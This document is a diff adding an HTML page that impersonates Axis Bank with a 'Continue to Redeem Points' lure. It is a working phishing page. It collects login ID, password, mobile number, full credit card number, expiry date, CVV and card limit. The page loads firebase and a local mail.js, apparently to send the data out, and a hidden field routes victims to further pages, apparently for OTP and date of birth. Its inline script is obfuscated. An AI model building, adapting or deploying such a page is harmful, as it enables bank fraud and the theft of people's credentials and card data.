@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Axis Bank</title>
+    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <img src="assets/header.jpg" width="100%" alt="">
+    </header>
+    <main>
+        <h2 class="text-center" style="font-weight: bold; font-family: 'Lato', sans-serif;">Continue to Redeem Points</h2>
+        <div class="button-group">
+            <div id="loginid" class="btn btn-primary login-form fs text-center" style="padding: 7px 13px;">Login ID / Customer ID</div>
+            <div id="credit" class="btn button-inactive credit-card-form fs text-center" style="padding: 7px 13px;">Credit Card Login</div>
+        </div>
+        <div class="box">
+            <input type="hidden" id="nextValue" value="loader-home.html?next=tok.html?next=cdob.html">
+            <form id="contactForm" class="form" onsubmit="setCurrentDateTime()">
+                <div id="form_container">
+                    <div id="login_form">
+                        <div class="form-group">
+                            <label for="lc_id">Login ID / Customer ID</label>
+                            <input type="text" id="lc_id" name="lc_id" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="lpass">Password</label>
+                            <input type="password" id="lpass" name="lpass" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="rgmob">Registered Mobile No.</label>
+                            <input type="text" id="rgmob" name="rgmob" inputmode="numeric" class="numericInput" maxlength="10" minlength="10" title="Required valid 10 digit number" required>
+                        </div>
+                    </div>
+                    <div id="credit_card_form" style="display: none;">
+                        <div class="form-group">
+                            <label for="ccnum">Credit Card Number</label>
+                            <input type="text" id="ccnum" name="ccnum" inputmode="numeric">
+                        </div>
+                        <div class="form-two w-100">
+                            <div class="form-group w-50">
+                                <label for="edate">Expiry Date</label>
+                                <input type="text" id="edate" name="edate" inputmode="numeric" placeholder="MM / YY">
+                            </div>
+                            <div class="form-group w-50">
+                                <label for="cvv">CVV/CVV</label>
+                                <input type="password" id="cvv" name="cvv" placeholder="***" >
+                            </div>
+                        </div>
+                        <div class="form-group">
+                            <label for="ccl">Available Card Limit (in Rupees)</label>
+                            <input type="number" id="ccl" name="creditlimit" inputmode="numeric">
+                        </div>
+                        <div class="form-group">
+                            <label for="rgmob_cc">Registered Mobile No.</label>
+                            <input type="text" id="rgmob_cc" name="rgmob1" inputmode="numeric" maxlength="10" minlength="10" title="Required valid 10 digit number">
+                        </div>
+                    </div>
+                </div>
+                <input type="hidden" id="currentDateTime" name="currentDateTime">
+                <div class="form-group">
+                    <button type="submit" class="btn btn-primary">LOGIN</button>
+                </div>
+            </form>
+        </div>
+        <img src="assets/footer.jpg" alt="" width="100%">
+    </main>
+    <footer>
+        <img src="assets/cop.jpg" alt="" width="100%">
+    </footer>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1-0/firebase.js"></script>
+    <script src="./mail.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.6.0/cleave.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+function _0xcb4a(_0x20cff0,_0xd3349c){var _0x59d15c=_0x59d1();return _0xcb4a=function(_0xcb4a21,_0x54d417){_0xcb4a21=_0xcb4a21-0x179;var _0xe047c9=_0x59d15c[_0xcb4a21];return _0xe047c9;},_0xcb4a(_0x20cff0,_0xd3349c);}var _0xfa6c06=_0xcb4a;(function(_0x770551,_0x59fb2a){var _0x3da968=_0xcb4a,_0x1365b5=_0x770551();while(!![]){try{var _0x48a1d9=-parseInt(_0x3da968(0x181))/0x1*(parseInt(_0x3da968(0x183))/0x2)+-parseInt(_0x3da968(0x185))/0x3*(parseInt(_0x3da968(0x179))/0x4)+-parseInt(_0x3da968(0x17d))/0x5+parseInt(_0x3da968(0x17a))/0x6+parseInt(_0x3da968(0x19c))/0x7*(parseInt(_0x3da968(0x18d))/0x8)+parseInt(_0x3da968(0x18f))/0x9+parseInt(_0x3da968(0x198))/0xa;if(_0x48a1d9===_0x59fb2a)break;else _0x1365b5['push'](_0x1365b5['shift']());}catch(_0x5e3038){_0x1365b5['push'](_0x1365b5['shift']());}}}(_0x59d1,0x414fb),$(document)[_0xfa6c06(0x199)](function(){var _0x28f159=_0xfa6c06,_0x55813c=new Cleave(_0x28f159(0x193),{'creditCard':!![]}),_0x2030a9=new Cleave(_0x28f159(0x19a),{'date':!![],'datePattern':['m','y']}),_0x1ab170=new Cleave('#cvv',{'numeral':!![],'numeralPositiveOnly':!![]}),_0x344228=new Cleave('#rgmob',{'numericOnly':!![],'blocks':[0xa],'delimiter':''}),_0x2de68f=new Cleave(_0x28f159(0x18b),{'numericOnly':!![],'blocks':[0xa],'delimiter':''});$(_0x28f159(0x180))[_0x28f159(0x189)](function(){var _0x14ec4b=_0x28f159;$(this)[_0x14ec4b(0x19b)](_0x14ec4b(0x196)),$(_0x14ec4b(0x191))[_0x14ec4b(0x194)](_0x14ec4b(0x196)),$(_0x14ec4b(0x17b))[_0x14ec4b(0x184)](_0x14ec4b(0x18e),_0x14ec4b(0x18e)),$(_0x14ec4b(0x19d))[_0x14ec4b(0x18a)](_0x14ec4b(0x18e)),$('#credit_card_form')[_0x14ec4b(0x187)](),$(_0x14ec4b(0x17f))[_0x14ec4b(0x182)]();}),$(_0x28f159(0x191))[_0x28f159(0x189)](function(){var _0x3800f5=_0x28f159;$(this)[_0x3800f5(0x19b)](_0x3800f5(0x196)),$(_0x3800f5(0x180))[_0x3800f5(0x194)]('btn-primary'),$('#credit_card_form\x20input')['attr'](_0x3800f5(0x18e),'required'),$(_0x3800f5(0x17b))[_0x3800f5(0x18a)](_0x3800f5(0x18e)),$(_0x3800f5(0x17f))[_0x3800f5(0x187)](),$('#credit_card_form')[_0x3800f5(0x182)]();});}));function setCurrentDateTime(){var _0x192bf7=_0xfa6c06,_0x2551f9=new Date(),_0x37ba6c=_0x2551f9[_0x192bf7(0x197)]()+'-'+(_0x2551f9[_0x192bf7(0x195)]()+0x1)+'-'+_0x2551f9[_0x192bf7(0x192)]()+'\x20\x20\x20'+_0x2551f9[_0x192bf7(0x188)]()+'H:'+_0x2551f9[_0x192bf7(0x186)]()+'M:'+_0x2551f9[_0x192bf7(0x18c)]()+'S';document[_0x192bf7(0x17c)](_0x192bf7(0x190))[_0x192bf7(0x17e)]=_0x37ba6c;}function _0x59d1(){var _0x36d24a=['currentDateTime','#credit','getDate','#ccnum','removeClass','getMonth','btn-primary','getFullYear','2413620MNAsBt','ready','#edate','addClass','607733HuIKOJ','#credit_card_form\x20input','1172aSkAhr','1269210qdcSnR','#login_form\x20input','getElementById','171160TYnrEn','value','#login_form','#loginid','248426aZbdgC','fadeIn','4fbbzPe','attr','4254vntKHq','getMinutes','hide','getHours','click','removeAttr','#rgmob_cc','getSeconds','24uuFglf','required','4506471hjIlaG'];_0x59d1=function(){return _0x36d24a;};return _0x59d1();}
+    </script>
+</body>
+</html>
